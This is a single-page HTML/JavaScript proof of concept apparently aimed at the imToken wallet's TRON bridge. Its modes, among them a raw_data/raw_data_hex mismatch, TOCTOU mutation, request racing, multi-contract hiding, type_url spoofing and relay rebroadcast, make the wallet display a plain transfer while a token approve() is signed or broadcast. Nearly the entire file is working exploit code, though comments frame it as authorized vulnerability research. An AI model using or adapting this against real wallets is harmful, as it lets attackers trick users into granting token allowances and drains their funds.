<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TRON sendTransaction preview mismatch PoC</title>
  </head>
  <body>
    <input id="previewRecipient" value="T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb" />
    <input id="previewAmount" value="10000" />
    <input id="tokenContract" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />
    <input id="spender" placeholder="defaults to current address" />
    <input id="approveAmount" value="1" />
    <input id="rpcUrl" value="https://api.trongrid.io" />
    <select id="mode">
      <option value="tocTouMutate">Mode C: sendTransaction + mutate tx.raw_data after preview (TOCTOU)</option>
      <option value="dualRequestRace">Mode F: transfer prompt + delayed approve request (flow state race)</option>
      <option value="multiContract">Mode G: one tx with TransferContract first + approve second</option>
      <option value="relayProbe">Mode H: custom RPC / malicious relay probe</option>
      <option value="capabilityDump">Mode I: dump bridge/provider capabilities</option>
      <option value="singleSignProbe">Mode J: one selected sign/bridge variant probe</option>
      <option value="approveWithDecoys">Mode D: consistent approve raw_data + transfer decoy fields</option>
      <option value="typeUrlSpoof">Mode E: approve raw_data + TransferContract type_url spoof</option>
      <option value="sendTransaction">Mode A: raw_data transfer / raw_data_hex approve (reproduces SIGERROR)</option>
      <option value="signAndRebroadcast">Mode B: sign-only probe</option>
    </select>
    <select id="probeVariant">
      <option value="tronWebSignTx">tronWeb.trx.sign(tx)</option>
      <option value="tronWebSignTxNoHeader">tronWeb.trx.sign(tx, undefined, false)</option>
      <option value="tronWebSignApproveTx">tronWeb.trx.sign(approveTx.transaction)</option>
      <option value="tronWebSignApproveTxNoHeader">tronWeb.trx.sign(approveTx.transaction, undefined, false)</option>
      <option value="tronWebSignRawHexNoHeader">tronWeb.trx.sign(approve.raw_data_hex, undefined, false)</option>
      <option value="imTokenPromisifySignTransaction">imToken.callPromisifyAPI('tron.signTransaction')</option>
      <option value="imTokenCallAPISignTransaction">imToken.callAPI('tron.signTransaction')</option>
      <option value="imTokenCallAPISign">imToken.callAPI('tron.sign')</option>
    </select>
    <input id="mutationDelayMs" value="1200" />
    <button id="runBtn">Run PoC</button>
    <pre id="status"></pre>
    <pre id="previewTx"></pre>
    <pre id="approveTx"></pre>

    <script>
      const $ = (id) => document.getElementById(id);
      const statusEl = $('status');
      const previewEl = $('previewTx');
      const approveEl = $('approveTx');
      const runBtn = $('runBtn');

      function setStatus(value) {
        statusEl.textContent = value;
      }

      function safeStringify(value) {
        return JSON.stringify(value, null, 2);
      }

      function getCurrentAccount() {
        const account = window.tronWeb?.defaultAddress?.base58;
        if (!account) {
          throw new Error('No TRON account detected. Please open this page inside imToken with a TRON wallet selected.');
        }
        return account;
      }

      async function postJson(url, body) {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify(body),
        });
        if (!response.ok) {
          throw new Error(`HTTP ${response.status} from ${url}`);
        }
        return await response.json();
      }

      async function tryPostJson(url, body) {
        try {
          return { ok: true, result: await postJson(url, body) };
        } catch (error) {
          return { ok: false, error: error?.message || String(error) };
        }
      }

      function normalizeRpcUrl() {
        const uiValue = $('rpcUrl').value.trim();
        const providerValue = window.tronWeb?.fullNode?.host;
        return (uiValue || providerValue || 'https://api.trongrid.io').replace(/\/$/, '');
      }

      function snapshotProvider() {
        return {
          tronWebFullNodeHost: window.tronWeb?.fullNode?.host,
          tronWebSolidityNodeHost: window.tronWeb?.solidityNode?.host,
          tronWebEventServerHost: window.tronWeb?.eventServer?.host,
          hasSetFullNode: typeof window.tronWeb?.setFullNode === 'function',
          hasSetSolidityNode: typeof window.tronWeb?.setSolidityNode === 'function',
          hasSetEventServer: typeof window.tronWeb?.setEventServer === 'function',
          hasImTokenCallPromisifyAPI: typeof window.imToken?.callPromisifyAPI === 'function',
          hasImTokenCallAPI: typeof window.imToken?.callAPI === 'function',
          hasTronRequest: typeof window.tron?.request === 'function',
          tronKeys: window.tron ? Object.keys(window.tron).sort() : [],
          imTokenKeys: window.imToken ? Object.keys(window.imToken).sort() : [],
          tronWebKeys: window.tronWeb ? Object.keys(window.tronWeb).sort() : [],
          tronWebTrxKeys: window.tronWeb?.trx ? Object.keys(window.tronWeb.trx).sort() : [],
        };
      }

      function tryOverrideProvider(host) {
        const log = [];

        const tryStep = (label, fn) => {
          try {
            const result = fn();
            log.push(`[ok] ${label}: ${safeStringify(result)}`);
          } catch (error) {
            log.push(`[err] ${label}: ${error?.message || String(error)}`);
          }
        };

        if (window.tronWeb?.setFullNode) {
          tryStep('tronWeb.setFullNode(host)', () => window.tronWeb.setFullNode(host));
        }
        if (window.tronWeb?.setSolidityNode) {
          tryStep('tronWeb.setSolidityNode(host)', () => window.tronWeb.setSolidityNode(host));
        }
        if (window.tronWeb?.setEventServer) {
          tryStep('tronWeb.setEventServer(host)', () => window.tronWeb.setEventServer(host));
        }
        if (window.tronWeb?.fullNode) {
          tryStep('tronWeb.fullNode.host = host', () => {
            window.tronWeb.fullNode.host = host;
            return window.tronWeb.fullNode.host;
          });
        }
        if (window.tronWeb?.solidityNode) {
          tryStep('tronWeb.solidityNode.host = host', () => {
            window.tronWeb.solidityNode.host = host;
            return window.tronWeb.solidityNode.host;
          });
        }
        if (window.tronWeb?.eventServer) {
          tryStep('tronWeb.eventServer.host = host', () => {
            window.tronWeb.eventServer.host = host;
            return window.tronWeb.eventServer.host;
          });
        }

        return log;
      }

      function encodeApproveParams(spender, amount) {
        const spenderHex = window.tronWeb.address
          .toHex(spender)
          .replace(/^41/, '')
          .padStart(64, '0');
        const amountHex = BigInt(amount).toString(16).padStart(64, '0');
        return spenderHex + amountHex;
      }

      async function buildPreviewTransfer(from) {
        const rpc = normalizeRpcUrl();
        const result = await postJson(`${rpc}/wallet/createtransaction`, {
          owner_address: from,
          to_address: $('previewRecipient').value.trim(),
          amount: Number($('previewAmount').value.trim()),
          visible: true,
        });
        if (result.Error) {
          throw new Error(`createtransaction failed: ${result.Error}`);
        }
        return result;
      }

      async function buildApprove(from, spender) {
        const rpc = normalizeRpcUrl();
        const result = await postJson(`${rpc}/wallet/triggersmartcontract`, {
          owner_address: from,
          contract_address: $('tokenContract').value.trim(),
          function_selector: 'approve(address,uint256)',
          parameter: encodeApproveParams(spender, $('approveAmount').value.trim()),
          fee_limit: 100000000,
          call_value: 0,
          visible: true,
        });
        if (!result?.result?.result || !result?.transaction?.raw_data_hex) {
          throw new Error(`triggersmartcontract failed: ${safeStringify(result)}`);
        }
        return result;
      }

      // Root cause (authorized test): tron.sendTransaction does not enforce
      // consistency between tx.raw_data (used to render the preview) and
      // tx.raw_data_hex (used by the signer). Preview source != sign source.
      //   raw_data      -> TransferContract        (what the user sees)
      //   raw_data_hex  -> TriggerSmartContract     (what is actually signed)
      //   txID          -> follows raw_data_hex so the broadcast is self-consistent
      function buildMismatchedTx(previewTransfer, approveTx) {
        return {
          ...approveTx.transaction,
          raw_data: previewTransfer.raw_data,
          raw_data_hex: approveTx.transaction.raw_data_hex,
          txID: approveTx.transaction.txID,
        };
      }

      function cloneJson(value) {
        return JSON.parse(JSON.stringify(value));
      }

      function readVarint(hex, offset) {
        let result = 0n;
        let shift = 0n;
        let index = offset;

        while (index < hex.length) {
          const byte = BigInt(parseInt(hex.slice(index, index + 2), 16));
          result |= (byte & 0x7fn) << shift;
          index += 2;
          if ((byte & 0x80n) === 0n) {
            return { value: result, next: index };
          }
          shift += 7n;
        }

        throw new Error('Invalid protobuf varint in raw_data_hex.');
      }

      function parseTopLevelProtoFields(hex) {
        const fields = [];
        let offset = 0;

        while (offset < hex.length) {
          const start = offset;
          const key = readVarint(hex, offset);
          offset = key.next;
          const fieldNumber = Number(key.value >> 3n);
          const wireType = Number(key.value & 0x07n);

          if (wireType === 0) {
            const value = readVarint(hex, offset);
            offset = value.next;
          } else if (wireType === 1) {
            offset += 16;
          } else if (wireType === 2) {
            const length = readVarint(hex, offset);
            offset = length.next + Number(length.value) * 2;
          } else if (wireType === 5) {
            offset += 8;
          } else {
            throw new Error(`Unsupported protobuf wire type ${wireType}.`);
          }

          fields.push({
            fieldNumber,
            wireType,
            raw: hex.slice(start, offset),
          });
        }

        return fields;
      }

      function getContractFieldHexes(rawDataHex) {
        return parseTopLevelProtoFields(rawDataHex).filter((field) => field.fieldNumber === 11).map((field) => field.raw);
      }

      function replaceContractFieldHexes(baseRawDataHex, contractFieldHexes) {
        const fields = parseTopLevelProtoFields(baseRawDataHex);
        const output = [];
        let inserted = false;

        for (const field of fields) {
          if (field.fieldNumber === 11) {
            if (!inserted) {
              output.push(...contractFieldHexes);
              inserted = true;
            }
            continue;
          }
          output.push(field.raw);
        }

        if (!inserted) {
          output.push(...contractFieldHexes);
        }

        return output.join('');
      }

      function hexToBytes(hex) {
        const bytes = new Uint8Array(hex.length / 2);
        for (let i = 0; i < bytes.length; i += 1) {
          bytes[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
        }
        return bytes;
      }

      async function sha256Hex(hex) {
        const digest = await crypto.subtle.digest('SHA-256', hexToBytes(hex));
        return Array.from(new Uint8Array(digest))
          .map((byte) => byte.toString(16).padStart(2, '0'))
          .join('');
      }

      async function buildMultiContractTx(previewTransfer, approveTx) {
        if (!previewTransfer.raw_data_hex || !approveTx.transaction.raw_data_hex) {
          throw new Error('Missing raw_data_hex; cannot build multi-contract transaction.');
        }

        const transferContracts = getContractFieldHexes(previewTransfer.raw_data_hex);
        const approveContracts = getContractFieldHexes(approveTx.transaction.raw_data_hex);
        if (transferContracts.length !== 1 || approveContracts.length !== 1) {
          throw new Error(
            `Unexpected contract count. transfer=${transferContracts.length}, approve=${approveContracts.length}`
          );
        }

        const tx = cloneJson(approveTx.transaction);
        tx.raw_data.contract = [
          cloneJson(previewTransfer.raw_data.contract[0]),
          cloneJson(approveTx.transaction.raw_data.contract[0]),
        ];
        tx.raw_data_hex = replaceContractFieldHexes(approveTx.transaction.raw_data_hex, [
          transferContracts[0],
          approveContracts[0],
        ]);
        tx.txID = await sha256Hex(tx.raw_data_hex);
        return tx;
      }

      function buildConsistentApproveWithTransferDecoys(previewTransfer, approveTx) {
        const tx = cloneJson(approveTx.transaction);
        const transferValue = previewTransfer.raw_data.contract[0].parameter.value;
        const approveValue = tx.raw_data.contract[0].parameter.value;

        // Differential parser probe: a strict node should ignore/reject these
        // extra fields for TriggerSmartContract, but a weak preview renderer may
        // key off amount/to_address and show this as a normal transfer.
        approveValue.to_address = transferValue.to_address;
        approveValue.amount = transferValue.amount;

        return tx;
      }

      function buildTypeUrlSpoofTx(previewTransfer, approveTx) {
        const tx = buildConsistentApproveWithTransferDecoys(previewTransfer, approveTx);
        tx.raw_data.contract[0].parameter.type_url = 'type.googleapis.com/protocol.TransferContract';
        return tx;
      }

      function describeContract(rawData) {
        const contract = rawData?.contract?.[0] ?? {};
        const value = contract.parameter?.value ?? {};
        return {
          type: contract.type,
          owner_address: value.owner_address,
          to_address: value.to_address,
          contract_address: value.contract_address,
          amount: value.amount,
          data_selector: value.data ? value.data.slice(0, 8) : undefined,
        };
      }

      function findSignature(value) {
        const sig =
          value?.signature ??
          value?.tx?.signature ??
          value?.transaction?.signature ??
          value?.result?.signature ??
          value?.signedTransaction?.signature;
        if (!sig) return null;
        return Array.isArray(sig) ? sig : [sig];
      }

      function withTimeout(promise, ms, label) {
        return new Promise((resolve, reject) => {
          const timer = setTimeout(() => {
            reject(new Error(`${label} timed out after ${ms}ms`));
          }, ms);
          Promise.resolve(promise).then(
            (value) => {
              clearTimeout(timer);
              resolve(value);
            },
            (error) => {
              clearTimeout(timer);
              reject(error);
            }
          );
        });
      }

      function callApiWithCallback(method, params, timeoutMs = 30000) {
        if (!window.imToken?.callAPI) {
          throw new Error('window.imToken.callAPI is unavailable.');
        }

        return withTimeout(
          new Promise((resolve, reject) => {
            const callback = (error, result) => {
              if (error) {
                reject(error instanceof Error ? error : new Error(safeStringify(error)));
                return;
              }
              resolve(result);
            };

            try {
              const immediate = window.imToken.callAPI(method, params, callback);
              if (immediate !== undefined) {
                resolve({ immediate });
              }
            } catch (error) {
              reject(error);
            }
          }),
          timeoutMs,
          `imToken.callAPI('${method}')`
        );
      }

      async function runSelectedSignProbe(account, mismatchedTx, approveTx) {
        const variant = $('probeVariant').value;
        const params = {
          from: account,
          tx: mismatchedTx,
          useTronHeader: true,
        };

        const cases = {
          tronWebSignTx: () => window.tronWeb.trx.sign(mismatchedTx),
          tronWebSignTxNoHeader: () => window.tronWeb.trx.sign(mismatchedTx, undefined, false),
          tronWebSignApproveTx: () => window.tronWeb.trx.sign(approveTx.transaction),
          tronWebSignApproveTxNoHeader: () => window.tronWeb.trx.sign(approveTx.transaction, undefined, false),
          tronWebSignRawHexNoHeader: () => window.tronWeb.trx.sign(approveTx.transaction.raw_data_hex, undefined, false),
          imTokenPromisifySignTransaction: () =>
            window.imToken.callPromisifyAPI('tron.signTransaction', params),
          imTokenCallAPISignTransaction: () => callApiWithCallback('tron.signTransaction', params),
          imTokenCallAPISign: () =>
            callApiWithCallback('tron.sign', {
              from: account,
              data: approveTx.transaction.raw_data_hex,
              message: approveTx.transaction.raw_data_hex,
              useTronHeader: false,
            }),
        };

        if (!cases[variant]) {
          throw new Error(`Unknown probe variant: ${variant}`);
        }

        const result = await withTimeout(cases[variant](), 45000, variant);
        return { variant, result, signature: findSignature(result) };
      }

      // imToken's sign path differs from the vulnerable sendTransaction path.
      // Probe every plausible "sign only" entry point and log each raw result,
      // so we can find one that returns a signature over tx.raw_data_hex.
      async function signMismatch(account, tx) {
        const attempts = [
          {
            name: 'tronWeb.trx.sign(tx)',
            run: () => window.tronWeb?.trx?.sign?.(tx),
            available: () => !!window.tronWeb?.trx?.sign,
          },
          {
            name: "imToken.callPromisifyAPI('tron.signTransaction')",
            run: () =>
              window.imToken?.callPromisifyAPI?.('tron.signTransaction', {
                from: account,
                tx,
                useTronHeader: true,
              }),
            available: () => !!window.imToken?.callPromisifyAPI,
          },
          {
            name: "tron.request('tron_signTransaction')",
            run: () => window.tron?.request?.({ method: 'tron_signTransaction', params: [tx] }),
            available: () => !!window.tron?.request,
          },
        ];

        const log = [];
        for (const attempt of attempts) {
          if (!attempt.available()) {
            log.push(`[skip] ${attempt.name}: not available`);
            continue;
          }
          try {
            const result = await attempt.run();
            const signature = findSignature(result);
            log.push(`[ok] ${attempt.name} -> ${safeStringify(result)}`);
            if (signature) {
              return { signature, log };
            }
          } catch (error) {
            log.push(`[err] ${attempt.name}: ${error?.message || String(error)}`);
          }
        }
        return { signature: null, log };
      }

      // Re-broadcast with raw_data == approve so it is CONSISTENT with the
      // signature the wallet produced over raw_data_hex (approve). The node
      // builds the tx from raw_data only, so this passes signature validation.
      async function broadcastConsistentApprove(approveTx, signature) {
        const rpc = normalizeRpcUrl();
        return await postJson(`${rpc}/wallet/broadcasttransaction`, {
          visible: true,
          txID: approveTx.transaction.txID,
          raw_data: approveTx.transaction.raw_data,
          raw_data_hex: approveTx.transaction.raw_data_hex,
          signature,
        });
      }

      async function run() {
        runBtn.disabled = true;
        try {
          const account = getCurrentAccount();
          const spender = $('spender').value.trim() || account;

          const previewTransfer = await buildPreviewTransfer(account);
          previewEl.textContent = safeStringify(previewTransfer.raw_data);

          const approveTx = await buildApprove(account, spender);
          const approveData = approveTx.transaction.raw_data.contract[0].parameter.value.data;
          approveEl.textContent = safeStringify({
            txID: approveTx.transaction.txID,
            raw_data_hex: approveTx.transaction.raw_data_hex,
            selector: approveData.slice(0, 8),
            approve_data: approveData,
          });

          if (approveData.slice(0, 8).toLowerCase() !== '095ea7b3') {
            throw new Error(`Unexpected approve selector: ${approveData.slice(0, 8)}`);
          }

          const mode = $('mode').value;
          const delayMs = Number($('mutationDelayMs').value.trim() || '1200');

          if (mode === 'sendTransaction') {
            const tx = buildMismatchedTx(previewTransfer, approveTx);
            setStatus(
              [
                `Mode: ${mode}`,
                'Expected result: SIGERROR.',
                '--- Wallet preview source: tx.raw_data (transfer) ---',
                safeStringify(describeContract(tx.raw_data)),
                '--- Signature source: tx.raw_data_hex (approve) ---',
                safeStringify(describeContract(approveTx.transaction.raw_data)),
              ].join('\n')
            );

            // Reproduces the SIGERROR: wallet broadcasts raw_data (transfer)
            // together with a signature over raw_data_hex (approve). The node
            // validates against raw_data, so signature recovery yields a wrong
            // address -> "not contained of permission".
            if (!window.imToken?.callPromisifyAPI) {
              throw new Error('window.imToken.callPromisifyAPI is unavailable. Please use imToken dapp browser.');
            }
            const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
              from: account,
              tx,
              useTronHeader: true,
            });
            setStatus(
              [
                'sendTransaction returned (expected to fail with SIGERROR):',
                safeStringify(result),
              ].join('\n')
            );
            return;
          }

          if (mode === 'tocTouMutate') {
            const tx = buildMismatchedTx(previewTransfer, approveTx);
            setStatus(
              [
                `Mode: ${mode}`,
                `Will mutate tx.raw_data to approve after ${delayMs}ms.`,
                'If the wallet keeps rawTx by reference, preview can show transfer while broadcast uses approve.',
                '--- Initial preview source: tx.raw_data (transfer) ---',
                safeStringify(describeContract(tx.raw_data)),
                '--- Mutated execution source: tx.raw_data (approve) ---',
                safeStringify(describeContract(approveTx.transaction.raw_data)),
              ].join('\n')
            );

            if (!window.imToken?.callPromisifyAPI) {
              throw new Error('window.imToken.callPromisifyAPI is unavailable. Please use imToken dapp browser.');
            }

            const sendPromise = window.imToken.callPromisifyAPI('tron.sendTransaction', {
              from: account,
              tx,
              useTronHeader: true,
            });

            setTimeout(() => {
              tx.raw_data = approveTx.transaction.raw_data;
              tx.raw_data_hex = approveTx.transaction.raw_data_hex;
              tx.txID = approveTx.transaction.txID;
              setStatus(
                [
                  `Mode: ${mode}`,
                  'tx object mutated to consistent approve. Confirm the wallet prompt now.',
                  `approve txID: ${approveTx.transaction.txID}`,
                  safeStringify(describeContract(tx.raw_data)),
                ].join('\n')
              );
            }, delayMs);

            const result = await sendPromise;
            setStatus(
              [
                'sendTransaction returned after TOCTOU mutation.',
                `returned: ${safeStringify(result)}`,
                `expected approve txID: ${approveTx.transaction.txID}`,
                '',
                'If the returned/broadcast tx is the approve txID, the root cause includes rawTx reference reuse / TOCTOU.',
              ].join('\n')
            );
            return;
          }

          if (mode === 'dualRequestRace') {
            setStatus(
              [
                `Mode: ${mode}`,
                `Will submit approve ${delayMs}ms after opening the transfer confirmation.`,
                'Hypothesis: preview UI is created by request #1 (transfer), but pending sign/broadcast state is overwritten by request #2 (approve).',
                'Confirm only if the visible wallet prompt still shows the transfer.',
                '--- Request #1 preview/execution: transfer ---',
                safeStringify(describeContract(previewTransfer.raw_data)),
                '--- Request #2 execution candidate: approve ---',
                safeStringify(describeContract(approveTx.transaction.raw_data)),
                `approve txID: ${approveTx.transaction.txID}`,
              ].join('\n')
            );

            if (!window.imToken?.callPromisifyAPI) {
              throw new Error('window.imToken.callPromisifyAPI is unavailable. Please use imToken dapp browser.');
            }

            const wrap = async (label, promise) => {
              try {
                return { label, ok: true, result: await promise };
              } catch (error) {
                return { label, ok: false, error: error?.message || String(error) };
              }
            };

            const firstPromise = wrap(
              'request #1 transfer',
              window.imToken.callPromisifyAPI('tron.sendTransaction', {
                from: account,
                tx: previewTransfer,
                useTronHeader: true,
              })
            );

            const secondPromise = new Promise((resolve) => {
              setTimeout(() => {
                setStatus(
                  [
                    `Mode: ${mode}`,
                    'Submitting request #2 approve while request #1 confirmation may still be open.',
                    `approve txID: ${approveTx.transaction.txID}`,
                  ].join('\n')
                );
                resolve(
                  wrap(
                    'request #2 approve',
                    window.imToken.callPromisifyAPI('tron.sendTransaction', {
                      from: account,
                      tx: approveTx.transaction,
                      useTronHeader: true,
                    })
                  )
                );
              }, delayMs);
            });

            const outcomes = await Promise.all([firstPromise, secondPromise]);
            setStatus(
              [
                'Dual-request race finished.',
                safeStringify(outcomes),
                '',
                `expected transfer txID: ${previewTransfer.txID}`,
                `expected approve txID: ${approveTx.transaction.txID}`,
                '',
                'If the wallet showed transfer but the successful returned/broadcast tx is approve, the root cause is pending-flow state confusion.',
              ].join('\n')
            );
            return;
          }

          if (mode === 'multiContract') {
            const tx = await buildMultiContractTx(previewTransfer, approveTx);
            setStatus(
              [
                `Mode: ${mode}`,
                'One internally-consistent transaction contains two contracts:',
                '  #1 TransferContract (decoy / visible candidate)',
                '  #2 TriggerSmartContract approve (execution candidate)',
                '',
                'Hypothesis: the wallet confirmation page renders only contract[0], while java-tron validates and executes every contract in raw_data.contract.',
                'This should not produce SIGERROR because raw_data and raw_data_hex describe the same multi-contract transaction.',
                '',
                '--- contract[0] ---',
                safeStringify(describeContract(tx.raw_data.contract?.[0] ? { contract: [tx.raw_data.contract[0]] } : undefined)),
                '--- contract[1] ---',
                safeStringify(describeContract(tx.raw_data.contract?.[1] ? { contract: [tx.raw_data.contract[1]] } : undefined)),
                `multi txID: ${tx.txID}`,
                `approve-only txID for reference: ${approveTx.transaction.txID}`,
              ].join('\n')
            );

            if (!window.imToken?.callPromisifyAPI) {
              throw new Error('window.imToken.callPromisifyAPI is unavailable. Please use imToken dapp browser.');
            }

            const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
              from: account,
              tx,
              useTronHeader: true,
            });

            setStatus(
              [
                `sendTransaction returned for ${mode}.`,
                `returned: ${safeStringify(result)}`,
                `multi txID: ${tx.txID}`,
                '',
                'If the wallet only showed the transfer but this transaction lands, inspect the tx on-chain: contract[1] should be the approve.',
                'If the wallet shows both actions or an approval warning, this hypothesis is not the in-wild path on this version.',
              ].join('\n')
            );
            return;
          }

          if (mode === 'relayProbe') {
            const tx = buildMismatchedTx(previewTransfer, approveTx);
            const rpc = normalizeRpcUrl();
            const before = snapshotProvider();
            const overrideLog = tryOverrideProvider(rpc);
            const after = snapshotProvider();
            const registerResult = await tryPostJson(`${rpc}/__poc/registerApprove`, {
              txID: approveTx.transaction.txID,
              raw_data: approveTx.transaction.raw_data,
              raw_data_hex: approveTx.transaction.raw_data_hex,
              expected_selector: approveData.slice(0, 8),
            });

            setStatus(
              [
                `Mode: ${mode}`,
                'Hypothesis: imToken signs raw_data_hex (approve), then sends the mismatched signed payload to a DApp-controlled RPC/relay.',
                'A malicious relay can extract signature[] from that payload and rebroadcast with raw_data=approve, making approve land while the wallet displayed transfer.',
                '',
                `target rpcUrl/relay: ${rpc}`,
                '',
                '--- provider before override ---',
                safeStringify(before),
                '--- override attempts ---',
                overrideLog.join('\n') || '(none)',
                '--- provider after override ---',
                safeStringify(after),
                '--- optional relay register result ---',
                safeStringify(registerResult),
                '',
                'Confirm the wallet prompt only if it displays the transfer. Watch your proxy/relay: if it receives /wallet/broadcasttransaction with signature[] and raw_data_hex=approve, the combined exploit path is confirmed.',
                `expected approve txID if relay replays: ${approveTx.transaction.txID}`,
              ].join('\n')
            );

            if (!window.imToken?.callPromisifyAPI) {
              throw new Error('window.imToken.callPromisifyAPI is unavailable. Please use imToken dapp browser.');
            }

            const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
              from: account,
              tx,
              useTronHeader: false,
            });

            setStatus(
              [
                `sendTransaction returned for ${mode}.`,
                `returned: ${safeStringify(result)}`,
                `expected approve txID if a relay replayed the signature: ${approveTx.transaction.txID}`,
                '',
                'If the request still went to imToken/tron-mainnet instead of rpcUrl, this DApp-level relay path is not available through the public provider object.',
                'If your relay received the mismatched signed payload, the missing in-wild component is a malicious/custom broadcast relay.',
              ].join('\n')
            );
            return;
          }

          if (mode === 'capabilityDump') {
            setStatus(
              [
                `Mode: ${mode}`,
                'Bridge/provider capability snapshot:',
                safeStringify(snapshotProvider()),
                '',
                'Function previews:',
                safeStringify({
                  imTokenCallAPI: window.imToken?.callAPI
                    ? Function.prototype.toString.call(window.imToken.callAPI).slice(0, 800)
                    : null,
                  imTokenCallPromisifyAPI: window.imToken?.callPromisifyAPI
                    ? Function.prototype.toString.call(window.imToken.callPromisifyAPI).slice(0, 800)
                    : null,
                  tronWebTrxSign: window.tronWeb?.trx?.sign
                    ? Function.prototype.toString.call(window.tronWeb.trx.sign).slice(0, 800)
                    : null,
                }),
                '',
                'Use this to identify private bridge methods or provider mutability that could explain an in-wild chain beyond public tron.sendTransaction.',
              ].join('\n')
            );
            return;
          }

          if (mode === 'singleSignProbe') {
            const tx = buildMismatchedTx(previewTransfer, approveTx);
            setStatus(
              [
                `Mode: ${mode}`,
                `Variant: ${$('probeVariant').value}`,
                'This runs exactly one selected sign/bridge variant.',
                'If it returns signature[], the page will try to rebroadcast the consistent approve transaction.',
                '',
                'Wallet-visible candidate: transfer.',
                safeStringify(describeContract(tx.raw_data)),
                'Signature target candidate: approve.',
                safeStringify(describeContract(approveTx.transaction.raw_data)),
              ].join('\n')
            );

            const probe = await runSelectedSignProbe(account, tx, approveTx);
            if (!probe.signature) {
              setStatus(
                [
                  `Mode: ${mode}`,
                  `Variant: ${probe.variant}`,
                  'No signature found in result.',
                  safeStringify(probe.result),
                ].join('\n')
              );
              return;
            }

            const broadcast = await broadcastConsistentApprove(approveTx, probe.signature);
            setStatus(
              [
                `Mode: ${mode}`,
                `Variant: ${probe.variant}`,
                'Signature found and rebroadcast as consistent approve.',
                `signature: ${safeStringify(probe.signature)}`,
                `broadcast result: ${safeStringify(broadcast)}`,
                `expected approve txID: ${approveTx.transaction.txID}`,
              ].join('\n')
            );
            return;
          }

          if (mode === 'approveWithDecoys' || mode === 'typeUrlSpoof') {
            const tx =
              mode === 'approveWithDecoys'
                ? buildConsistentApproveWithTransferDecoys(previewTransfer, approveTx)
                : buildTypeUrlSpoofTx(previewTransfer, approveTx);

            setStatus(
              [
                `Mode: ${mode}`,
                'The signed/broadcast transaction is internally approve-consistent.',
                'This probes whether the wallet preview can be tricked by decoy transfer fields/type_url.',
                '--- tx.raw_data submitted to wallet ---',
                safeStringify(describeContract(tx.raw_data)),
                `txID: ${tx.txID}`,
              ].join('\n')
            );

            if (!window.imToken?.callPromisifyAPI) {
              throw new Error('window.imToken.callPromisifyAPI is unavailable. Please use imToken dapp browser.');
            }

            const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
              from: account,
              tx,
              useTronHeader: true,
            });

            setStatus(
              [
                `sendTransaction returned for ${mode}.`,
                `returned: ${safeStringify(result)}`,
                `expected approve txID: ${approveTx.transaction.txID}`,
                '',
                'If the confirmation page showed transfer and the result is approve, this is a parser-differential preview bug.',
              ].join('\n')
            );
            return;
          }

          // Mode B: ask wallet to sign only (it shows transfer, signs approve),
          // and log whether any sign-only entry point returns the signature.
          const tx = buildMismatchedTx(previewTransfer, approveTx);
          const { signature, log } = await signMismatch(account, tx);

          if (!signature) {
            setStatus(
              [
                'No signature returned by any sign API. Probe log:',
                ...log,
                '',
                'Paste this log back so we can identify the right sign entry point.',
              ].join('\n')
            );
            return;
          }

          const broadcast = await broadcastConsistentApprove(approveTx, signature);

          setStatus(
            [
              'Signed under a TransferContract preview, broadcast as approve.',
              ...log,
              `approve txID: ${approveTx.transaction.txID}`,
              `signature: ${safeStringify(signature)}`,
              `broadcast result: ${safeStringify(broadcast)}`,
              '',
              broadcast?.result === true || broadcast?.code === 'SUCCESS'
                ? 'WYSIWYS BROKEN: an approve landed while the user saw a transfer.'
                : 'Broadcast not accepted; inspect result above.',
            ].join('\n')
          );
        } catch (error) {
          console.error(error);
          setStatus(`Error: ${error.message || String(error)}`);
        } finally {
          runBtn.disabled = false;
        }
      }

      runBtn.addEventListener('click', run);
    </script>
  </body>
</html>
